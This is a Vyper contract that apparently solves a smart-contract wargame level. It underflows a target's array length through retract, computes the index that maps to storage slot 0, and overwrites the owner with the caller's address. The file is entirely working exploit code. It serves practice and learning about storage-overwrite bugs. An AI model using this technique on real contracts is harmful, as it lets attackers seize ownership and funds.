# @version ^0.3.7

interface InstanceInterface:
    def owner() -> address: view
    def codex(index: uint256) -> bytes32: view
    def contact() -> bool: view
    def make_contact(): nonpayable
    def retract(): nonpayable
    def revise(i: uint256, _content: bytes32): nonpayable

owner: immutable(address)

instance: InstanceInterface

@external
@payable
def __init__(_instance: InstanceInterface):
    owner = msg.sender
    self.instance = _instance
  
@external
def attack():
    assert msg.sender == owner, "!owner"
    sender: bytes32 = convert(msg.sender, bytes32)
    owner_loc: uint256 = max_value(uint256) - convert(keccak256(convert(1, bytes32)), uint256) + 1
    self.instance.make_contact()
    assert self.instance.contact() == True, "!contacted"

    self.instance.retract()
    assert self.instance.owner() == convert(slice(self.instance.codex(owner_loc), 12, 20), address), "!loc"

    self.instance.revise(owner_loc, sender)
    assert self.instance.owner() == msg.sender, "!passed"
